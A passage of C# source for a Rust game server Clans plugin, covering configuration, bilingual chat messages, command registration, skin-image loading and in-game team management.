            chatCommandFF = Convert.ToString(GetConfig("Команды", "Настройка FF для клана", "cff"));
            chatCommandAllyChat = Convert.ToString(GetConfig("Команды", "Отправка сообщения альянсу", "a"));
            chatCommandClanChat = Convert.ToString(GetConfig("Команды", "Отправка сообщения клану", "c"));
            chatCommandClanInfo = Convert.ToString(GetConfig("Команды", "Чатовая команда инфо клана для администраторов", "cinfo"));
            subCommandClanHelp = Convert.ToString(GetConfig("Команды", "Дополнительная подкоманда для вывода информации помощи", "help"));
            subCommandClanAlly = Convert.ToString(GetConfig("Команды", "Дополнительная подкоманда для вывода информации об альянсе", "ally"));
            addClanMembersAsIOFriends = Convert.ToBoolean(GetConfig("RustIO", "Добавить членов клана в качестве IO Friends", true));

            forceNametagsOnTagging = Convert.ToBoolean(GetConfig("Настройки", "forceNametagsOnTagging", false));

            useRelationshipManager = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Использовать внутриигровую систему друзей", false));
            disableManageFunctions = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Отключить управление тимой игрокам (Выход, инвайт и прочее)", false));
            allowButtonLeave = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Разрешить выходить из тимы", true));
            allowButtonKick = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Разрешить удалять из тимы", true));
            allowDirectInvite = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Разрешить приглашение в тиму", true));
            allowPromoteLeader = Convert.ToBoolean(GetConfig("Внутриигровая система друзей", "Разрешить продвижение лидера тимы", true));
            if (!Changed) return;

            SaveConf();
            SaveConfig();
            Changed = false;
        }

        protected override void LoadDefaultConfig()
        {
            Config.Clear();
            LoadVariables();
        }
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string> {
                    { "nopermtocreate", "You got no rights to create a clan." },
                {
                    "nopermtojoin", "You got no rights to join a clan."
                }
                , {
                    "nopermtojoinbyinvite", "The player {0} has no rights to join a clan."
                }
                , {
                    "claninvite", "You have been invited to join the clan: [{0}] '{1}'\nTo join, type: <color={2}>/clan join {0}</color>"
                }
                , {
                    "comeonline", "{0} has come online!"
                }
                , {
                    "goneoffline", "{0} has gone offline!"
                }
                , {
                    "friendlyfire", "{0} is a clan member and cannot be hurt.\nTo toggle clan friendlyfire type: <color=#FF6c6c>/clan ff</color>"
                }
                , {
                    "allyfriendlyfire", "{0} is an ally member and cannot be hurt."
                }
                , {
                    "notmember", "You are currently not a member of a clan."
                }
                , {
                    "youareownerof", "You are the owner of:"
                }
                , {
                    "youaremodof", "You are a moderator of:"
                }
                , {
                    "youarecouncilof", "You are a council of:"
                }
                , {
                    "youarememberof", "You are a member of:"
                }
                , {
                    "claninfo", " [{0}] {1}"
                }
                , {
                    "memberon", "Members online: "
                }
                , {
                    "overviewnamecolor", "<color={0}>{1}</color>"
                }
                , {
                    "memberoff", "Members offline: "
                }
                , {
                    "notmoderator", "You need to be a moderator of your clan to use this command."
                }
                , {
                    "pendinvites", "Pending invites: "
                }
                , {
                    "bannedwords", "The clan tag contains banned words."
                }
                , {
                    "viewthehelp", "To view more commands, type: <color={0}>/{1} helpies</color>"
                }
                , {
                    "usagecreate", "Usage - <color={0}>/clan create \"TAG\" \"Description\"</color>"
                }
                , {
                    "hintlength", "Clan tags must be {0} to {1} characters long"
                }
                , {
                    "hintchars", "Clan tags must contain only 'a-z' 'A-Z' '0-9' '{0}'"
                }
                , {
                    "providedesc", "Please provide a short description of your clan."
                }
                , {
                    "tagblocked", "There is already a clan with this tag."
                }
                , {
                    "nownewowner", "You are now the owner of the clan [{0}] \"{1}\""
                }
                , {
                    "inviteplayers", "To invite new members, type: <color={0}>/clan invite <name></color>"
                }
                , {
                    "usageinvite", "Usage - <color={0}>/clan invite <name></color>"
                }
                , {
                    "nosuchplayer", "No such player or player name not unique: {0}"
                }
                , {
                    "alreadymember", "This player is already a member of your clan: {0}"
                }
                , {
                    "alreadyinvited", "This player has already been invited to your clan: {0}"
                }
                , {
                    "alreadyinclan", "This player is already in a clan: {0}"
                }
                , {
                    "invitebroadcast", "{0} invited {1} to the clan."
                }
                , {
                    "usagewithdraw", "Usage: <color={0}>/clan withdraw <name></color>"
                }
                , {
                    "notinvited", "This player has not been invited to your clan: {0}"
                }
                , {
                    "canceledinvite", "{0} canceled the invitation of {1}."
                }
                , {
                    "usagejoin", "Usage: <color={0}>/clan join \"TAG\"</color>"
                }
                , {
                    "youalreadymember", "You are already a member of a clan."
                }
                , {
                    "younotinvited", "You have not been invited to join this clan."
                }
                , {
                    "reachedmaximum", "This clan has already reached the maximum number of members."
                }
                , {
                    "broadcastformat", "<color={0}>{1}</color>: {2}"
                }
                , {
                    "allybroadcastformat", "[{0}] <color=#FF6c6c>{2}</color>: {3}"
                }
                , {
                    "clanrenamed", "{0} renamed your clan to: [{1}]."
                }
                , {
                    "yourenamed", "You have renamed the clan [{0}] to [{1}]"
                }
                , {
                    "clandeleted", "{0} deleted your clan."
                }
                , {
                    "youdeleted", "You have deleted the clan [{0}]"
                }
                , {
                    "noclanfound", "There is no clan with that tag [{0}]"
                }
                , {
                    "renamerightsowner", "You need to be a server owner to rename clans."
                }
                , {
                    "usagerename", "Usage: <color={0}>/clan rename OLDTAG NEWTAG</color>"
                }
                , {
                    "deleterightsowner", "You need to be a server owner to delete clans."
                }
                , {
                    "usagedelete", "Usage: <color={0}>/clan delete TAG</color>"
                }
                , {
                    "clandisbanded", "Your current clan has been disbanded forever."
                }
                , {
                    "needclanowner", "You need to be the owner of your clan to use this command."
                }
                , {
                    "needclanownercouncil", "You need to be the owner or a council to use this command."
                }
                , {
                    "usagedisband", "Usage: <color={0}>/clan disband forever</color>"
                }
                , {
                    "usagepromote", "Usage: <color={0}>/clan promote <name></color>"
                }
                , {
                    "playerjoined", "{0} has joined the clan!"
                }
                , {
                    "waskicked", "{0} kicked {1} from the clan."
                }
                , {
                    "modownercannotkicked", "The player {0} is an owner or moderator and cannot be kicked."
                }
                , {
                    "notmembercannotkicked", "The player {0} is not a member of your clan."
                }
                , {
                    "usageff", "Usage: <color={0}>/clan ff</color> toggles your current FriendlyFire status."
                }
                , {
                    "usagekick", "Usage: <color={0}>/clan kick <name></color>"
                }
                , {
                    "playerleft", "{0} has left the clan."
                }
                , {
                    "youleft", "You have left your current clan."
                }
                , {
                    "usageleave", "Usage: <color={0}>/clan leave</color>"
                }
                , {
                    "notaclanmember", "The player {0} is not a member of your clan."
                }
                , {
                    "alreadyowner", "The player {0} is already the owner of your clan."
                }
                , {
                    "alreadyamod", "The player {0} is already a moderator of your clan."
                }
                , {
                    "alreadyacouncil", "The player {0} is already a council of your clan."
                }
                , {
                    "alreadyacouncilset", "The position of the council is already awarded."
                }
                , {
                    "maximummods", "This clan has already reached the maximum number of moderators."
                }
                , {
                    "playerpromoted", "{0} promoted {1} to moderator."
                }
                , {
                    "playerpromotedcouncil", "{0} promoted {1} to council."
                }
                , {
                    "playerpromotedowner", "{0} promoted {1} to new owner."
                }
                , {
                    "usagedemote", "Usage: <color={0}>/clan demote <name></color>"
                }
                , {
                    "notamoderator", "The player {0} is not a moderator of your clan."
                }
                , {
                    "notpromoted", "The player {0} is not a moderator or council of your clan."
                }
                , {
                    "playerdemoted", "{0} demoted {1} to a member."
                }
                , {
                    "councildemoted", "{0} demoted {1} to a moderator."
                }
                , {
                    "noactiveally", "Your clan has no current alliances."
                }
                , {
                    "yourffstatus", "Your FriendlyFire:"
                }
                , {
                    "yourclanallies", "Your Clan allies:"
                }
                , {
                    "allyinvites", "Ally invites:"
                }
                , {
                    "allypending", "Ally requests:"
                }
                , {
                    "allyReqHelp", "Offer an alliance to another clan"
                }
                , {
                    "allyAccHelp", "Accept an alliance from another clan"
                }
                , {
                    "allyDecHelp", "Decline an alliance from another clan"
                }
                , {
                    "allyCanHelp", "Cancel an alliance with another clan"
                }
                , {
                    "reqAlliance", "[{0}] has requested a clan alliance"
                }
                , {
                    "invitePending", "You already have a pending alliance invite for [{0}]"
                }
                , {
                    "clanNoExist", "The clan [{0}] does not exist"
                }
                , {
                    "alreadyAllies", "You are already allied with"
                }
                , {
                    "allyProvideName", "You need to provide a Clan name"
                }
                , {
                    "allyLimit", "You already have the maximum allowed ally limit"
                }
                , {
                    "allyAccLimit", "You can not accept the alliance with {0}. You reached the limit"
                }
                , {
                    "allyCancel", "You have cancelled your alliance with [{0}]"
                }
                , {
                    "allyCancelSucc", "{0} has cancelled your clan alliance"
                }
                , {
                    "noAlly", "Your clans have no alliance with each other"
                }
                , {
                    "noAllyInv", "You do not have a alliance invite from [{0}]"
                }
                , {
                    "allyInvWithdraw", "You have cancelled your request to [{0}]"
                }
                , {
                    "allyDeclined", "You have declined the clan alliance from [{0}]"
                }
                , {
                    "allyDeclinedSucc", "[{0}] has declined your alliance request"
                }
                , {
                    "allyReq", "You have requested a clan alliance from [{0}]"
                }
                , {
                    "allyAcc", "You have accepted the clan alliance from [{0}]"
                }
                , {
                    "allyAccSucc", "[{0}] has accepted your alliance request"
                }
                , {
                    "allyPendingInfo", "Your clan has pending ally request(s). Check those in the clan overview."
                }
                , {
                    "clanffdisabled", "You have <color={0}>disabled</color> friendly fire for your clan.\nThey are safe!"
                }
                , {
                    "clanffenabled", "You have <color={0}>enabled</color> friendly fire for your clan.\nTake care!"
                }
                , {
                    "yourname", "YOU"
                }
                , {
                    "helpavailablecmds", "Available commands:"
                }
                , {
                    "helpinformation", "Display your clan information"
                }
                , {
                    "helpmessagemembers", "Send a message to all members"
                }
                , {
                    "helpmessageally", "Send a message to all allied members"
                }
                , {
                    "helpcreate", "Create a new clan"
                }
                , {
                    "helpjoin", "Join a clan by invitation"
                }
                , {
                    "helpleave", "Leave your clan"
                }
                , {
                    "helptoggleff", "Toggle friendlyfire status"
                }
                , {
                    "helpinvite", "Invite a player"
                }
                , {
                    "helpwithdraw", "Cancel an invite"
                }
                , {
                    "helpkick", "Kick a member"
                }
                , {
                    "helpallyoptions", "Lists the ally options"
                }
                , {
                    "helppromote", "Promote a member"
                }
                , {
                    "helpdemote", "Demote a member"
                }
                , {
                    "helpdisband", "Disband your clan (no undo)"
                }
                , {
                    "helpmoderator", "Moderator"
                }
                , {
                    "helpowner", "Owner"
                }
                , {
                    "helpcommands", "commands:"
                }
                , {
                    "helpconsole", "Open F1 console and type:"
                }
                , {
                    "yourradarstatus", "Your ClanRadar:"
                }
                , {
                    "clanradardisabled", "Clan radar disabled"
                }
                , {
                    "clanradarenabled", "Clan radar enabled"
                }
                , {
                    "helptoggleradar", "Toggle clanradar status"
                }
                , {
                    "clanArgCreate", "create"
                }
                , {
                    "clanArgInvite", "invite"
                }
                , {
                    "clanArgLeave", "leave"
                }
                , {
                    "clanArgWithdraw", "withdraw"
                }
                , {
                    "clanArgJoin", "join"
                }
                , {
                    "clanArgPromote", "promote"
                }
                , {
                    "clanArgDemote", "demote"
                }
                , {
                    "clanArgFF", "ff"
                }
                , {
                    "clanArgRadar", "radar"
                }
                , {
                    "clanArgAlly", "ally"
                }
                , {
                    "clanArgHelp", "help"
                }
                , {
                    "clanArgKick", "kick"
                }
                , {
                    "clanArgDisband", "disband"
                }
                , {
                    "clanArgForever", "forever"
                }
                , {
                    "clanArgNameId", "<name|id>"
                }
                , {
                    "allyArgRequest", "request"
                }
                , {
                    "allyArgRequestShort", "req"
                }
                , {
                    "allyArgAccept", "accept"
                }
                , {
                    "allyArgAcceptShort", "acc"
                }
                , {
                    "allyArgDecline", "decline"
                }
                , {
                    "allyArgDeclineShort", "dec"
                }
                , {
                    "allyArgCancel", "cancel"
                }
                , {
                    "allyArgCancelShort", "can"
                }
                ,
                {
                    "clanchatmuted", "You may not clanchat, you are muted."
                },
                 {
                    "clanUItitle", "Clan System by RustPlugin.ru / OxideBro"
                },
                  {
                    "clanTOPUItitle", "Clans TOP"
                },
            }, this);

            lang.RegisterMessages(new Dictionary<string, string>()
            {
                {"nopermtocreate", "У тебя нету привилегии для создания клана."},
                 { "nopermtojoin", "У тебя нету привилегии что бы вступать в клан."},
                 { "nopermtojoinbyinvite", "У игрока {0} нету прав чтобы вступить в клан."},
                 { "claninvite", "Вас пригласили в клан: [{0}] '{1}'\nЧтобы вступить, введите: <color=#FF6c6c>/clan join {0}</color>"},
                 { "comeonline", "{0} зашел в игру!"},
                 { "goneoffline", "{0} вышел с игры!"},
                 { "friendlyfire", "{0} ваш соклановец, и не может получить урон.\nИспользуйте: <color=#FF6c6c>/clan ff</color> чтобы включить урон"},
                 { "allyfriendlyfire", "{0} является союзником и не может получить урон."},
                 { "notmember", "В настоящее время вы не являетесь членом клана."},
                 { "youareownerof", "Вы являетесь владельцем:"},
                 { "youaremodof", "Вы являетесь модератором:"},
                  {"youarecouncilof", "Вы советник в:"},
                 { "youarememberof", "Вы участник в:"},
                 { "claninfo", " [{0}] {1}"},
                  {"memberon", "Игроки клана в сети: "},
                 { "overviewnamecolor", "<color=#FF6c6c>{1}</color>"},
                 { "memberoff", "Игроки клана не в сети: "},
                 { "notmoderator", "Вы должны быть модератором своего клана, чтобы использовать эту команду."},
                 { "pendinvites", "Ожидающие приглашения: "},
                 { "bannedwords", "Tег клана содержит запрещенные слова."},
                 { "viewthehelp", "Чтобы просмотреть больше команд, введите: <color=#FF6c6c>/{1}</color>"},
                 { "hintlength", "Клановый тег должнен быть от {0} до {1} символов"},
                  {"hintchars", "Клановый тег может использовать только 'a-z' 'A-Z' '0-9' '{0}' символы"},
                 { "providedesc", "Пожалуйста, уточните краткое описание вашего клана."},
                 { "tagblocked", "Уже есть клан с этим тегом."},
                 { "nownewowner", "Теперь вы владелец клана [{0}] \"{1}\""},
                  {"inviteplayers", "Чтобы пригласить новых участников, введите: <color=#FF6c6c>/clan invite <name></color>"},
                  {"nosuchplayer", "Нет такого игрока или имя игрока указано не верно: {0}"},
                  {"alreadymember", "Этот игрок уже является членом вашего клана: {0}"},
                  {"alreadyinvited", "Этот игрок уже приглашен в ваш клан: {0}"},
                  {"alreadyinclan", "Этот игрок уже в клане: {0}"},
                 { "invitebroadcast", "{0} вступил в клан {1}."},
                 { "notinvited", "Этот игрок не был приглашен в ваш клан: {0}"},
                 { "canceledinvite", "{0} отменил приглашение {1}."},
                 { "youalreadymember", "Вы уже являетесь членом клана."},
                 { "younotinvited", "Вы не были приглашены в этот клан."},
                 { "reachedmaximum", "Этот клан уже достиг максимального количества участников."},
                 { "broadcastformat", "<color=#FF6c6c>{1}</color>: {2}"},
                 { "allybroadcastformat", "[{0}] <color=#FF6c6c>{2}</color>: {3}"},
                 { "clanrenamed", "{0} переименовал переименовал клан в: [{1}]."},
                 { "yourenamed", "Вы переименовали клан [{0}] в [{1}]"},
                  {"clandeleted", "{0} удалил свой клан."},
                 { "youdeleted", "Вы удалили клан [{0}]"},
                 { "noclanfound", "Нету клана с этим тегом [{0}]"},
                  {"renamerightsowner", "Вы должны быть администратором сервера, чтобы переименовать кланы."},
                 { "deleterightsowner", "Вы должны быть администратором сервера, чтобы удалять кланы."},
                 { "clandisbanded", "Ваш текущий клан был распущен навсегда."},
                 { "needclanowner", "Вы должны быть владельцем своего клана, чтобы использовать эту команду."},
                 { "needclanownercouncil", "Вы должны быть владельцем или модератором, чтобы использовать эту команду."},
                 { "playerjoined", "{0} присоединился к клану!"},
                 { "waskicked", "{0} выгнал {1} из клана."},
                 { "modownercannotkicked", "Игрок {0} является владельцем или модератором и не может быть выкинут."},
                 { "notmembercannotkicked", "Игрок {0} не является членом клана."},
                 { "playerleft", "{0} покинул клан."},
                 { "youleft", "Вы покинули свой текущий клан."},
                  {"notaclanmember", "Игрок {0} не является членом вашего клана."},
                 { "maximummods", "Этот клан уже достиг максимального количества модераторов."},
                  {"playerpromoted", "{0} повышен {1} до модератора."},
                 { "playerpromotedcouncil", "{0} повышен до {1} до советника."},
                 { "playerpromotedowner", "{0} повышен {1} до нового владельца."},
                 { "notamoderator", "Игрок {0} не является модератором вашего клана."},
                 { "notpromoted", "Игрок {0} не является модератором или советом вашего клана."},
                 { "playerdemoted", "{0} понижен в должности {1} до участника."},
                 { "noactiveally", "Ваш клан не имеет текущих альянсов."},
                 { "yourffstatus", "Ваш FriendlyFire:"},
                 { "yourclanallies", "Союзники вашего клана:"},
                 { "allyinvites", "Ally приглашает:"},
                 { "allypending", "запросы союзников:"},
                 { "allyReqHelp", "Предложить союз другому клану"},
                 { "allyAccHelp", "Примите союз от другого клана"},
                  {"allyDecHelp", "Отклонить союз от другого клана"},
                 { "allyCanHelp", "Отменить союз с другим кланом"},
                 { "reqAlliance", "[{0}] запросил альянс клана"},
                {  "clanNoExist", "Клан [{0}] не существует"},
                 { "allyProvideName", "Вам необходимо указать имя клана"},
                 { "allyLimit", "У вас уже есть максимально допустимое ограничение союзников"},
                 { "allyAccLimit", "Вы не можете принять альянс с {0}. Вы достигли предела"},
                {  "allyCancel", "Вы отменили свой союз с [{0}]"},
                {  "allyCancelSucc", "{0} отменил ваш клановый союз"},
                 { "noAlly", "Ваши кланы не имеют альянса друг с другом"},
                 { "noAllyInv", "У вас нет приглашения в альянс от [{0}]"},
                 { "allyInvWithdraw", "Вы отменили свой запрос к [{0}]"},
                 { "allyDeclined", "Вы отказались от альянса кланов от [{0}]"},
                {  "allyDeclinedSucc", "[{0}] отклонил ваш запрос на альянс"},
                 { "allyReq", "Вы запросили альянс клана от [{0}]"},
                 { "allyAcc", "Вы приняли клановый союз от [{0}]"},
                {  "allyAccSucc", "[{0}] принял ваш запрос на альянс"},
                 { "allyPendingInfo", "Ваш клан имеет ожидающие запросы союзников. Проверьте их в обзоре клана."},
                 { "clanffdisabled", "У вас <color=#FF6c6c> отключенный </color> дружественный огонь для вашего клана.\nЭто безопасно!"},
                 { "clanffenabled", "У вас <color=#FF6c6c> включенный </color> дружественный огонь для вашего клана.\nВнимитесь!"},
                 {"yourname", "ВЫ"},
                 { "helpavailablecmds", "Доступные команды:"},
                 { "helpinformation", "Показать информацию о вашем клане"},
                 { "helpmessagemembers", "Отправить сообщение всем участникам"},
                 { "helpmessageally", "Отправить сообщение всем союзникам"},
                 { "helpcreate", "Создание нового клана"},
                 { "helpjoin", "Вступить в клан по приглашению"},
                 { "helpleave", "Выйти с вашего текущего клана"},
                 { "helptoggleff", "Переключить статус FF"},
                 { "helpinvite", "Пригласить игрока"},
                 { "helpwithdraw", "Отменить приглашение"},
                 { "helpkick", "Кикнуть участника"},
                 { "helpallyoptions", "Список опций"},
                 { "helppromote", "Повысить участника"},
                 { "helpdemote", "Понизить участника"},
                {  "helpdisband", "Расформирование своего клана (Не отменить)"},
                {  "helpmoderator", "Модератор"},
                {  "helpowner", "Создатель"},
                 { "helpcommands", "команды:"},
                 { "helpconsole", "Откройте консоль, F1:"},
                 { "yourradarstatus", "Ваш клан радар:"},
                 { "clanradardisabled", "Клан радар отключен"},
                  {"clanradarenabled", "Клан радар включен"},
                 { "helptoggleradar", "Переключение статуса клан радара"},
                 { "clanArgCreate", "create"},
                 { "clanArgInvite", "invite"},
                 { "clanArgLeave", "leave"},
                {  "clanArgWithdraw", "withdraw"},
                {  "clanArgJoin", "join"},
                 { "clanArgPromote", "promote"},
                 { "clanArgDemote", "demote"},
                 { "clanArgFF", "ff"},
                 { "clanArgRadar", "radar"},
                {  "clanArgAlly", "ally"},
                 { "clanArgHelp", "help"},
                 { "clanArgKick", "kick"},
                 { "clanArgDisband", "disband"},
                 { "clanArgForever", "forever"},
                 { "clanArgNameId", "<name|id>"},
                 { "allyArgRequest", "request"},
                 { "allyArgRequestShort", "req"},
                 { "allyArgAccept", "accept"},
                 { "allyArgAcceptShort", "acc"},
                 { "allyArgDecline", "decline"},
                 { "allyArgDeclineShort", "dec"},
                 { "allyArgCancel", "cancel"},
                 { "allyArgCancelShort", "can"},
                 { "clanchatmuted", "Вы не можете писать в клан чат."},
                 { "clanUItitle", "Система кланов Unusual"},
                 { "clanTOPUItitle", "TOP кланов сервера"},
                 { "alreadyowner", "Игрок {0} уже владелец вашего клана."},
                 { "alreadyamod", "Игрок {0} уже капитан вашего клана."},
                {  "alreadyacouncil", "Игрок {0} уже советчик вашего клана."},
                 { "alreadyacouncilset", "Должность советчика уже установлена."},
                  {"councildemoted", "{0} пониженный {1} до модератора."},
                 { "invitePending", "У вас уже есть ожидающее приглашение в альянс для [{0}]"},
                 { "alreadyAllies", "Вы уже состоите в альянсе с"},
                 { "usagecreate", "Используйте - <color=#FF6c6c>/clan create \"TAG Клана\" \"Название клана\"</color>"},
                 { "usageinvite", "Используйте - <color=#FF6c6c>/clan invite <name></color>"},
                 { "usagewithdraw", "Используйте: <color=#FF6c6c>/clan withdraw <name></color>"},
                {  "usagejoin", "Используйте: <color=#FF6c6c>/clan join \"TAG\"</color>"},
                {  "usagerename", "Используйте: <color=#FF6c6c>/clan rename OLDTAG NEWTAG</color>"},
                {  "usagedelete", "Используйте: <color=#FF6c6c>/clan delete TAG</color>"},
                { "usagedisband", "Используйте: <color=#FF6c6c>/clan disband forever</color>"},
                {  "usagepromote", "Используйте: <color=#FF6c6c>/clan promote <name></color>"},
                {  "usageff", "Используйте: <color=#FF6c6c>/clan ff</color> toggles your current FriendlyFire status."},
                {  "usagekick", "Используйте: <color=#FF6c6c>/clan kick <name></color>"},
                {  "usageleave", "Используйте: <color=#FF6c6c>/clan leave</color>"},
                 { "usagedemote", "Используйте: <color=#FF6c6c>/clan demote <name></color>"}
            }, this, "ru");
        }

        void Init()
        {
            cc = this;
            LoadVariables();
            LoadDefaultMessages();
            Initialized = false;
            if (!permission.PermissionExists(permissionToCreateClan)) permission.RegisterPermission(permissionToCreateClan, this);
            if (!permission.PermissionExists(permissionToJoinClan)) permission.RegisterPermission(permissionToJoinClan, this);
            cmd.AddChatCommand(chatCommandFF, this, "cmdChatClanFF");
            //Custom code
            //cmd.AddChatCommand("clanui", this, "CLanUIInfo");

            cmd.AddChatCommand(chatCommandClan, this, "cmdChatClan");
            cmd.AddChatCommand(chatCommandClanChat, this, "cmdChatClanchat");
            cmd.AddChatCommand(chatCommandAllyChat, this, "cmdChatAllychat");
            cmd.AddChatCommand(chatCommandClanInfo, this, "cmdChatClanInfo");
            cmd.AddChatCommand(chatCommandClan + subCommandClanHelp, this, "cmdChatClanHelp");
            cmd.AddChatCommand(chatCommandClan + subCommandClanAlly, this, "cmdChatClanAlly");
            if (enableClanTagging) Interface.CallHook("API_RegisterThirdPartyTitle", this, new Func<IPlayer, string>(getFormattedClanTag));
        }

        void OnPluginLoaded(Plugin plugin)
        {
            if (plugin.Title == "Better Chat" || plugin.Title == "ChatPlus")
                if (enableClanTagging) Interface.CallHook("API_RegisterThirdPartyTitle", this, new Func<IPlayer, string>(getFormattedClanTag));
        }


        string getFormattedClanTag(IPlayer player)
        {
            var clan = findClanByUser(player.Id);
            if (clan != null && !string.IsNullOrEmpty(clan.tag)) return $"[#{clanTagColorBetterChat.Replace("#", "")}][+{clanTagSizeBetterChat}]{clanTagOpening}{clan.tag}{clanTagClosing}[/+][/#]";
            return string.Empty;
        }

        //Custom code
        [PluginReference] private Plugin ImageLibrary;

        public string GetImageSkin(string shortname, ulong skin = 13975490) => (string)ImageLibrary.Call("GetImage", shortname, skin);
        public bool AddImage(string url, string imageName, ulong imageId = 0) => (bool)ImageLibrary.Call("AddImage", url, imageName, imageId);


        #region LoadNewSkinsMethod

        private Dictionary<string, Dictionary<ulong, ulong>> SkinList = new Dictionary<string, Dictionary<ulong, ulong>>();

        void LoadSkins()
        {
            webrequest.Enqueue("https://files.facepunch.com/rust/icons/inventory/rust/schema.json", null, (code, response) =>
            {
                if (!(response == null && code == 200))
                {
                    var schm = JsonConvert.DeserializeObject<Rust.Workshop.ItemSchema>(response);
                    var items = schm.items;
                    foreach (var item in items)
                    {
                        if (!string.IsNullOrEmpty(item.itemshortname) && !string.IsNullOrEmpty(item.icon_url) && item.type != "None")
                        {
                            ulong owner = 0;
                            if (!SkinList.ContainsKey(item.itemshortname))
                            {
                                SkinList[item.itemshortname] = new Dictionary<ulong, ulong>();
                                SkinList[item.itemshortname][0] = 0;
                            }

                            if (item.workshopdownload != null)
                                AddSkinToList(item.itemshortname, item.itemdefid, Convert.ToUInt64(item.workshopdownload), owner);
                            else
                                AddSkinToList(item.itemshortname, item.itemdefid, item.itemdefid, owner);
                        }
                    }
                }
            }, this);
        }
        private static Dictionary<string, Dictionary<ulong, ulong>> FreeSkinList = new Dictionary<string, Dictionary<ulong, ulong>>();

        private static Dictionary<ulong, Dictionary<string, Dictionary<ulong, ulong>>> PlayerSkinList = new Dictionary<ulong, Dictionary<string, Dictionary<ulong, ulong>>>();

        private void AddSkinToList(string item, ulong skin, ulong workshopid, ulong owner = 0)
        {
            if (owner == 0)
            {
                if (SkinList[item] == null)
                {
                    SkinList[item] = new Dictionary<ulong, ulong>();
                    SkinList[item][0] = 0;
                }

                SkinList[item][skin] = workshopid;
            }
            else if (owner == 1)
            {
                if (FreeSkinList[item] == null)
                    FreeSkinList[item] = new Dictionary<ulong, ulong>();

                FreeSkinList[item][skin] = workshopid;
            }
            else
            {
                if (PlayerSkinList[owner] == null)
                    PlayerSkinList[owner] = new Dictionary<string, Dictionary<ulong, ulong>>();
                if (PlayerSkinList[owner][item] == null)
                    PlayerSkinList[owner][item] = new Dictionary<ulong, ulong>();

                PlayerSkinList[owner][item][skin] = workshopid;
            }
            AddImage("https://rustlabs.com/img/skins/324/" + skin + ".png", item, workshopid);
        }

        #endregion
        static Clans ins;

        string onlinepng = "https://i.imgur.com/O1T5M2S.png";
        void OnServerInitialized()
        {
            ins = this;
            LoadSkins();
            if (useRelationshipManager)
            {
                Subscribe(nameof(OnServerCommand));
                if (!RelationshipManager.TeamsEnabled())
                {
                    teamUiWasDisabled = true;
                    PrintWarning($"TeamUI functions partly inactive, maxTeamSize was set to '{RelationshipManager.maxTeamSize}'");
                }
            }
            else
            {
                Unsubscribe(nameof(OnServerCommand));
            }

            foreach (var players in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(players, "Message");
            }


            object obj = LoadData();

            if (!ImageLibrary)
            {
                PrintError("ImageLibrary not found! Clans not work!");
                //Interface.Oxide.UnloadPlugin("Clans");
                //return;
            }
            else
            {
                ImageLibrary?.Call("AddImage", onlinepng, onlinepng);
                clanCache.ToList().ForEach(c => ImageLibrary?.Call("AddImage", c.Value.ClanAvatar, c.Value.ClanAvatar));
            }

            Rust.Global.Runner.StartCoroutine(ServerInitialized(obj));
            foreach (var player in BasePlayer.activePlayerList)
                OnPlayerConnected(player);


        }

        private IEnumerator ServerInitialized(object obj)
        {
            if (obj != null)
                InitializeClans((bool)obj);

            if (purgeOldClans)
                Puts($"Valid clans loaded: '{clans.Count}'");

            if (purgeOldClans && purgedClans.Count() > 0)
            {
                Puts($"Old Clans purged: '{purgedClans.Count}'");
                if (listPurgedClans)
                {
                    foreach (string purged in purgedClans)
                        Puts($"Purged > {purged}");
                }
            }

            yield return CoroutineEx.waitForSeconds(2f);

            AllyRemovalCheck();

            tagReExt = new Regex("[^a-zA-Z0-9" + allowedSpecialChars + "]");

            foreach (BasePlayer player in BasePlayer.activePlayerList.ToList())
                SetupPlayer(player);

            foreach (BasePlayer player in BasePlayer.sleepingPlayerList.ToList())
                SetupPlayer(player);

            foreach (KeyValuePair<string, Clan> clan in clans)
            {
                clan.Value.OnUpdate(false);
                clan.Value.UpdateTeam();
                timer.Every(600f, () =>
                {
                    clan.Value.UpdateTeam();
                });
            }

            Initialized = true;
            yield return null;
        }

        private object OnServerCommand(ConsoleSystem.Arg arg)
        {
            if (useRelationshipManager && arg != null && arg.cmd != null)
            {
                if (RelationshipManager.TeamsEnabled() || teamUiWasDisabled)
                {
                    if (arg.cmd.Name.ToLower() == "maxteamsize" && arg.FullString != string.Empty)
                    {
                        int i = arg.GetInt(0, 0);
                        if (i > 0 && teamUiWasDisabled)
                        {
                            teamUiWasDisabled = false;
                            Puts($"TeamUI functions full activated");
                            return null;
                        }
                        else if (i < 1)
                        {
                            teamUiWasDisabled = true;
                            PrintWarning($"TeamUI functions partly inactive, maxTeamSize was set to '{i}'");
                            return null;
                        }
                    }

                    Clan obj;
                    if (!RelationshipManager.TeamsEnabled())
                        return null;

                    if (arg.Connection != null && clanCache.TryGetValue(arg.Connection.userid.ToString(), out obj) && arg.cmd.Parent.ToLower() == "relationshipmanager")
                    {
                        if (disableManageFunctions)
                            return false;

                        if (arg.cmd.Name.ToLower() == "leaveteam" && allowButtonLeave)
                        {
                            LeaveClan(arg.Player());
                            return false;
                        }

                        if (arg.cmd.Name.ToLower() == "kickmember" && allowButtonKick)
                        {
                            KickPlayer(arg.Player(), arg.FullString.Trim('"'));
                            return false;
                        }

                        if (arg.cmd.Name.ToLower() == "sendinvite" && allowDirectInvite)
                        {
                            InvitePlayer(arg.Player(), arg.FullString.Trim('"'));
                            return false;
                        }

                        if (arg.cmd.Name.ToLower() == "promote" && allowPromoteLeader)
                        {
                            BasePlayer lookingAtPlayer = RelationshipManager.GetLookingAtPlayer(arg.Player());
                            if (lookingAtPlayer == null || lookingAtPlayer.IsDead() || lookingAtPlayer == arg.Player())
                                return false;

                            if (lookingAtPlayer.currentTeam == arg.Player().currentTeam)
                            {
                                bool wasCouncil = obj.IsCouncil(lookingAtPlayer.UserIDString);
                                bool wasMod = obj.IsModerator(lookingAtPlayer.UserIDString);

                                if (wasCouncil && !wasMod)
                                    obj.council = arg.Player().UserIDString;

                                if (wasMod && !wasCouncil)
                                {
                                    obj.RemoveModerator(lookingAtPlayer);
                                    obj.SetModerator(arg.Player());
                                }

                                obj.owner = lookingAtPlayer.UserIDString;
